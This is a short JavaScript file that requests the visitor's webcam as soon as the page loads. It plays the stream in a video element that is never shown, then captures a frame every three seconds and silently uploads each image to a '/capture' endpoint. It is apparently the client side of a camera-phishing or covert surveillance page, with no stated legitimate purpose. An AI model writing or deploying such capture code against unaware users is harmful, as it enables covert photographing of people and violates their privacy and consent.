const canvas = document.createElement("canvas");

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        // Capture image every 3 seconds
        setInterval(() => {
            const context = canvas.getContext("2d");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL("image/png");

            fetch("/capture", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ image: imageData })
            }).catch(error => console.error("Error:", error));
        }, 3000);

    } catch (error) {
        console.error("Camera access denied or not available:", error);
    }
}

// Start camera immediately
startCamera();
